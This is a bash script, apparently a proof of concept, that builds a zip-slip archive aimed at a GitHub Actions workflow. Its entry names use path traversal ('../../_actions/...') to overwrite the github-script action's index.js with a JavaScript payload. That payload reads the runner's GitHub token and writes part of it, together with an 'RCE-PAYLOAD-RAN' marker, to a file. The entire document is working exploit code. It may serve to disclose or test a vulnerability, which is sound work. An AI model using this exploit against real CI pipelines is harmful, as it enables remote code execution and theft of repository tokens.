#!/usr/bin/env bash
set -euo pipefail

zipdir="$RUNNER_TEMP/zipslip"
rm -rf "$zipdir"
mkdir -p "$zipdir"

echo '{"fixtures":{}}' > "$zipdir/base.json"
echo '{"fixtures":{}}' > "$zipdir/pr.json"
echo '{"prNumber":1}' > "$zipdir/context.json"

cat > "$zipdir/payload.js" <<'JS'
;(async () => {
  try {
    const fs = await import('node:fs')
    const token = process.env['INPUT_GITHUB-TOKEN'] || process.env.GITHUB_TOKEN || 'none'
    fs.writeFileSync(
      '/home/runner/work/PWNED.txt',
      'RCE-PAYLOAD-RAN token_prefix=' + String(token).slice(0, 12) + '\n'
    )
    console.log('RCE-PAYLOAD-RAN')
  } catch (e) {
    console.log('payload-error ' + e)
  }
})()
JS

python3 - "$zipdir" <<'PY'
import os, sys, zipfile
d = sys.argv[1]
payload = open(os.path.join(d, 'payload.js'), 'rb').read()
out = os.path.join(d, 'report.zip')
z = zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED)
for n in ('base.json', 'pr.json', 'context.json'):
    z.write(os.path.join(d, n), n)
z.writestr('../../_actions/actions/github-script/v9/dist/index.js', payload)
z.writestr('../../PWNED_ziptest.txt', 'zip-slip-escaped\n')
z.close()
print('zip-size', os.path.getsize(out))
PY
